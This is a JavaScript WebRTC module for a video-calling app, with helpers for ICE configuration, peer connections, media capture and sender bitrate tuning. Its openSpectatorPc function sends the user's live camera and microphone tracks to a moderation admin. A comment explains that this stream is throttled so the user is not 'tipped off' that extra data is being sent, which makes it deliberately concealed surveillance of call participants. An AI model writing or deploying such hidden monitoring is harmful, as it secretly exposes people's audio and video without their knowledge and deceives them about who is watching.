import { api } from './api.js';

export async function fetchIceConfig() {
  const { data } = await api.post('/calls/ice-config');
  return data;
}

// no-op default
export const __noop = () => {};

export function createPeer(iceServers) {
  return new RTCPeerConnection({
    iceServers,
    iceCandidatePoolSize: 4,
    bundlePolicy: 'max-bundle',
    rtcpMuxPolicy: 'require',
  });
}

export async function getLocalStream() {
  return navigator.mediaDevices.getUserMedia({
    video: {
      width: { ideal: 1280, max: 1920 },
      height: { ideal: 720, max: 1080 },
      frameRate: { ideal: 30, max: 30 },
      facingMode: 'user',
    },
    audio: {
      echoCancellation: true,
      noiseSuppression: true,
      autoGainControl: true,
      channelCount: 1,
      sampleRate: 48000,
    },
  });
}

/**
 * Send-only RTCPeerConnection to a moderation admin who's spectating the
 * call. The admin doesn't broadcast back, so we just push our existing
 * tracks. Returns the PC + a cleanup() function.
 *
 * Wires up signaling via the supplied socket on these events:
 *   emit  rtc:spec-offer   { adminId, callId, sdp }
 *   emit  rtc:spec-ice     { toUserId: adminId, callId, candidate, fromAdmin: false }
 *   on    rtc:spec-answer  { fromAdminId, sdp }   (filtered to this admin)
 *   on    rtc:spec-ice     { fromUserId, candidate } (filtered to this admin)
 */
export async function openSpectatorPc({
  iceServers,
  localStream,
  socket,
  callId,
  adminId,
}) {
  const pc = createPeer(iceServers);

  // Push existing call tracks (no recvonly; the admin doesn't share back).
  for (const track of localStream.getTracks()) {
    pc.addTrack(track, localStream);
  }

  pc.onicecandidate = (e) => {
    if (e.candidate) {
      socket.emit('rtc:spec-ice', {
        toUserId: adminId,
        callId,
        candidate: e.candidate,
        fromAdmin: false,
      });
    }
  };

  const onAnswer = async ({ fromAdminId, sdp }) => {
    if (String(fromAdminId) !== String(adminId)) return;
    try {
      await pc.setRemoteDescription(sdp);
    } catch {
      /* ignore */
    }
  };
  const onIce = async ({ fromUserId, candidate }) => {
    if (String(fromUserId) !== String(adminId)) return;
    try {
      await pc.addIceCandidate(candidate);
    } catch {
      /* ignore */
    }
  };
  socket.on('rtc:spec-answer', onAnswer);
  socket.on('rtc:spec-ice', onIce);

  const offer = await pc.createOffer();
  await pc.setLocalDescription(offer);
  socket.emit('rtc:spec-offer', { adminId, callId, sdp: offer });

  // Cap the spectator stream way below the main call so adding it doesn't
  // visibly degrade the user's outbound bandwidth (and tip them off that
  // something extra is being sent).
  tuneSenders(pc, { videoBitrate: 500_000, audioBitrate: 32_000 }).catch(() => {});

  return {
    pc,
    cleanup: () => {
      socket.off('rtc:spec-answer', onAnswer);
      socket.off('rtc:spec-ice', onIce);
      try { pc.close(); } catch { /* ignore */ }
    },
  };
}

export async function tuneSenders(pc, { videoBitrate = 2_000_000, audioBitrate = 64_000 } = {}) {
  for (const sender of pc.getSenders()) {
    if (!sender.track) continue;
    const params = sender.getParameters();
    if (!params.encodings || params.encodings.length === 0) {
      params.encodings = [{}];
    }
    if (sender.track.kind === 'video') {
      params.encodings[0].maxBitrate = videoBitrate;
      params.encodings[0].maxFramerate = 30;
      params.degradationPreference = 'maintain-framerate';
    } else if (sender.track.kind === 'audio') {
      params.encodings[0].maxBitrate = audioBitrate;
    }
    try {
      await sender.setParameters(params);
    } catch {
      /* some browsers reject after negotiation; ignore */
    }
  }
}
